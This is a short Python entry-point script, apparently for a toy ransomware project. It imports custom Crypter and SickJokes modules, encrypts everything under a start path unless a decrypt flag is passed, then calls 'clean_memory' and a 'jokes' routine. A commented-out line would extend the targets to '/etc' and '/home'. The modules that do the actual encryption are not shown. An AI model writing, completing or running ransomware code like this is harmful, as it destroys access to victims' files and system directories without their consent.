#!/usr/bin/python
import PathFolderArchives, Crypter, ArgumentsParser, SickJokes


start_path = [PathFolderArchives.INITIAL_PATH, 
                    # '/etc', '/home' 
                    ]

def main():
    user_argument = ArgumentsParser.enter_argument_parser()
    decrypt = user_argument['decrypt']
    """
    Sera que funciona assim? 
    decrypt = ArgumentsParser.enter_argument_parser()
    
    """

    if not decrypt:
        Crypter.encrypt(start_path)
        SickJokes.clean_memory()
        SickJokes.jokes()
    
    else:
        Crypter.decrypt(start_path)
        SickJokes.clean_memory()
  

if __name__ == '__main__':
    main()